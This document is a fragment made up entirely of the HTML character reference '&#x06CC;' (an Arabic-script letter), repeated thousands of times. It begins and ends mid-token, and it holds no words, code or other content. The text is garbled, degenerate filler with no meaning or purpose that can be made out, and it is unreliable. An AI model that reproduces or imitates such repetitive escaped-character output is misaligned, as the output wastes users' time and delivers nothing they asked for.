06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#